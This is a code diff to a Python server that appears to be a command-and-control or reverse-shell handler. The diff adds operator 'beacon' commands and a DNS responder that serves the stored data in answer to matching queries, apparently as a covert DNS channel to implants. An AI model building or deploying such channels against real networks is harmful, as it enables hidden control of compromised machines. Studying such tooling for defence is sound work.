@@ -1,7 +1,25 @@
 import os, sys, socket, signal, json, selectors
 
-# basic magic number
+# dns config
 DNS_UDP_PORT = 53
+DNS_TTL = 3600
+DNS_HEADSZ = 12
+DNS_LIMIT = 512
+DNS_CLASSES = {
+    1: 'IN',
+    3: 'CH',
+    4: 'HS'
+}
+DNS_CLASS_NUMBERS = {v: k for k, v in DNS_CLASSES.items()}
+DNS_RECORD_TYPES = {
+    1: 'A',
+    2: 'NS',
+    5: 'CNAME',
+    15: 'MX',
+    16: 'TXT',
+    28: 'AAAA'
+}
+DNS_RECORD_TYPE_NUMBERS = {v: k for k, v in DNS_RECORD_TYPES.items()}
 # initial crypto config
 SERVER_PROMPT = b'pk> '
 CONNECTED_PROMPT = b'$ '
@@ -114,6 +132,70 @@ def cliinfo(clients):
     except Exception as e:
         return repr(e)
 
+def parse_enum(value, lookup):
+    try:
+        value = str(value, 'utf-8').upper()
+        if value[0] == '@':
+            return int(value[1:])
+        elif value in lookup:
+            return lookup[value]
+        return None
+    except:
+        return None
+
+def format_enum(value, lookup):
+    return lookup[value] if value in lookup else '@%d' % value
+
+def create_beacon(data=None, hostname=None, qtype=None, qclass=b'IN', *_args):
+    try:
+        data = bytes.fromhex(str(data, 'utf-8'))
+    except:
+        data = None
+    if not data or not hostname or not qtype:
+        return '[pk] Usage: beacon <data:hex> <hostname> <TYPE> [CLASS]'
+    qtype = parse_enum(qtype, DNS_RECORD_TYPE_NUMBERS)
+    if not qtype:
+        return '[pk] Invalid record type. Supports %s, or @n for raw type number n.'\
+                % ', '.join(DNS_RECORD_TYPE_NUMBERS.keys())
+    qclass = parse_enum(qclass, DNS_CLASS_NUMBERS)
+    if not qclass:
+        return '[pk] Invalid class type. Supports %s, or @n for raw class number n.'\
+                % ', '.join(DNS_CLASS_NUMBERS.keys())
+    
+    beacons[(hostname, qtype, qclass)] = data
+    return ''
+
+def beaconinfo(beacons):
+    info = ''
+    i = 0
+    for key in beacons:
+        info += '- %s %s %s: %s\n' % \
+            (str(key[0], 'utf-8'), format_enum(key[1], DNS_RECORD_TYPES),\
+            format_enum(key[2], DNS_CLASSES), beacons[key].hex())
+        i += 1
+    info += '[pk] %d total.' % i
+    return info
+
+def delbeacon(hostname=None, qtype=None, qclass=None, *_args):
+    if not hostname:
+        return '[pk] Usage: delbeacon <hostname> [TYPE [CLASS]]'
+    qtype = parse_enum(qtype, DNS_RECORD_TYPE_NUMBERS)
+    qclass = parse_enum(qclass, DNS_CLASS_NUMBERS)
+
+    matched_keys = []
+    for key in beacons:
+        if key[0] != hostname:
+            continue
+        if qtype and key[1] != qtype:
+            continue
+        if qclass and key[2] != qclass:
+            continue
+        print('[INFO] Deleting beacon', key)
+        matched_keys.append(key)
+    for key in matched_keys:
+        del beacons[key]
+    return ''
+
 def screens_detach(sel, screen):
     global screens
     sel.unregister(screen['sock'])
@@ -147,7 +229,7 @@ def screens_pty(sel, screen, client):
         return
 
 def screens_read(sel, sock, screen):
-    global cmdq, tcp_clients, screens, privkey, bits
+    global beacons, cmdq, tcp_clients, screens, privkey, bits
     if not screen['alive']:
         return
     try:
@@ -178,12 +260,20 @@ def screens_read(sel, sock, screen):
         elif cmd == b'\xde\xad':
             screens_detach(sel, screen)
             return
+        elif cmd[:6] == b'beacon':
+            resp = create_beacon(*cmd[7:].split(b' '))
+        elif cmd == b'nbeacons':
+            resp = '[pk] Active beacons: %d' % len(beacons)
+        elif cmd == b'lbeacons':
+            resp = '[pk] Active beacons:\n%s' % beaconinfo(beacons)
+        elif cmd[:9] == b'delbeacon':
+            resp = delbeacon(*cmd[10:].split(b' '))
         elif cmd == b'nscreen':
-            resp = 'Active screens: %d' % len(screens)
+            resp = '[pk] Active screens: %d' % len(screens)
         elif cmd == b'ncli':
-            resp = 'Active TCP clients: %d' % len(tcp_clients)
+            resp = '[pk] Active TCP clients: %d' % len(tcp_clients)
         elif cmd == b'lcli':
-            resp = 'Active TCP clients:\n%s' % cliinfo(tcp_clients)
+            resp = '[pk] Active TCP clients:\n%s' % cliinfo(tcp_clients)
         elif cmd == b'lq':
             resp = '[%s]' % ', '.join(map(lambda s : repr(betterstr(s)), cmdq))
         elif cmd == b'cq':
@@ -418,39 +508,18 @@ def register_tcp(sel, port):
     sel.register(sock, selectors.EVENT_READ, tcp_accept)
     print('[INFO] TCP listener started on port %d/tcp' % port)
 
-def transport_dns(sel, sock):
-    try:
-        req, addr = sock.recvfrom(1024)
-    except:
-        print('[WARNING] Error receiving DNS query.')
-        return
-    dns_refuse(sock, addr, req)
-
-def dns_refuse(sock, addr, req):
-    # ID = req.id
-    resp = bytearray(req[0:2])
-    # QR = 1 | opcode[4] = req.opcode | AA = 0 | TC = 0 | RD = req.rd
-    resp.append((req[2] & 0b11111001) | 0b10000000)
-    # RA = 0 | Z[3] = 0 | rcode[4] = 5 (REFUSED)
-    resp.append(5)
-    # QDCount = req.QDCount
-    try:
-        qdcount = int.from_bytes(req[4:6], 'big')
-        resp.extend(req[4:6])
-    except:
-        qdcount = 0
-        resp.extend(b'\x00' * 2)
-    # ANCount = NSCount = ARCount = 0
-    resp.extend(b'\x00' * 6)
-    # Copy question section
-    dns_copy_queries(qdcount, req[12:], resp)
-
-    sock.sendto(resp, addr)
+def dns_abort(sock, addr, resp, rcode = 1):
+        resp = resp[:3] # Truncate partial questions and answers
+        resp.append(rcode) # RA | Z | RCODE
+        # QDCount = ANCount = NSCount = ARCount = 0
+        resp.extend(b'\x00' * 8)
+        sock.sendto(resp, addr)
 
 def dns_copy_queries(qdcount, qdsect, buffer):
-    print('qdsect=', qdsect)
     for _ in range(qdcount):
         while True:
+            if len(qdsect) < 1:
+                return
             labelsize = qdsect[0] + 1
             buffer.extend(qdsect[:labelsize])
             qdsect = qdsect[labelsize:]
@@ -459,6 +528,88 @@ def dns_copy_queries(qdcount, qdsect, buffer):
         # QType | QClass
         buffer.extend(qdsect[:4])
         qdsect = qdsect[4:]
+
+def dns_parse_queries(qdcount, qdsect):
+    queries, ofs = [], 0
+    for _ in range(qdcount):
+        labels = []
+        name_ofs = ofs
+        while True:
+            if ofs >= len(qdsect):
+                return []
+            labelsize = qdsect[ofs] + 1
+            labels.append(qdsect[ofs+1:ofs+labelsize])
+            ofs += labelsize
+            if labelsize < 2:
+                break
+        try:
+            qtype = int.from_bytes(qdsect[ofs:ofs+2], 'big')
+            qclass = int.from_bytes(qdsect[ofs+2:ofs+4], 'big')
+        except:
+            return []
+        queries.append({
+            'name': b'.'.join(labels[:-1]),
+            'name_ofs': DNS_HEADSZ + name_ofs,
+            'type': qtype,
+            'class': qclass
+        })
+    return queries
+
+def dns_populate_answer(buffer, answer):
+    buffer.append(0xc0)
+    buffer.append(answer['query']['name_ofs'])
+    buffer.extend(answer['query']['type'].to_bytes(2, 'big'))
+    buffer.extend(answer['query']['class'].to_bytes(2, 'big'))
+    buffer.extend(DNS_TTL.to_bytes(4, 'big'))
+    buffer.extend(len(answer['data']).to_bytes(2, 'big'))
+    buffer.extend(answer['data'])
+
+def dns_answer(sock, addr, req, answers):
+    # ID = req.id
+    resp = bytearray(req[0:2])
+    # QR = 1 | opcode[4] | AA = 1 | TC = 0 | RD
+    resp.append((req[2] & 0b11111001) | 0b10000100)
+    # RA = 0 | Z[3] = 0 | rcode[4] = 0 (NO ERROR)
+    resp.append(0)
+
+    try:
+        # QDCount = req.QDCount
+        qdcount = int.from_bytes(req[4:6], 'big')
+        resp.extend(req[4:6])
+    except:
+        dns_abort(sock, addr, resp, rcode=1) # FORMERROR
+        return
+
+    # ANCount
+    resp.extend(len(answers).to_bytes(2, 'big'))
+    # NSCount = ARCount = 0
+    resp.extend(b'\x00' * 4)
+    dns_copy_queries(qdcount, req[DNS_HEADSZ:], resp)
+    for answer in answers:
+        dns_populate_answer(resp, answer)
+
+    if len(resp) > DNS_LIMIT:
+        dns_abort(sock, addr, resp, rcode=5) # REFUSED
+    else:
+        sock.sendto(resp, addr)
+
+def transport_dns(sel, sock):
+    try:
+        req, addr = sock.recvfrom(1024)
+        qdcount = int.from_bytes(req[4:6], 'big')
+    except:
+        print('[WARNING] Error receiving DNS query.')
+        return
+
+    queries = dns_parse_queries(qdcount, req[DNS_HEADSZ:])
+    answers = []
+    for query in queries:
+        if (query['name'], query['type'], query['class']) in beacons:
+            answers.append({
+                'query': query,
+                'data': beacons[(query['name'], query['type'], query['class'])]
+            })
+    dns_answer(sock, addr, req, answers)
 
 def register_dns(sel):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -554,11 +705,12 @@ def main(args):
             pass
 
 
-    global alive, screens, tcp_clients, cmdq, breaker
+    global alive, screens, tcp_clients, cmdq, beacons, breaker
     alive = True
     screens = []
     tcp_clients = []
     cmdq = []
+    beacons = {}
     sel = selectors.DefaultSelector()
     breakee, breaker = socket.socketpair()
     sel.register(breakee, selectors.EVENT_READ, None)
